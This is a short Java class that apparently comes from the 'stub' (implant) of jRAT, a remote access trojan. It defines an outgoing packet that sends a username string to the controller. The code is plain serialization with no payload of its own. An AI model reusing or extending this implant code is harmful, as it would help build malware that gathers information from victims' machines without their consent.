package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;

public class Packet22InitUsername extends AbstractOutgoingPacket {

	private String username;

	public Packet22InitUsername(String username) {
		this.username = username;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(username);
	}

	@Override
	public byte getPacketId() {
		return (byte) 22;
	}
}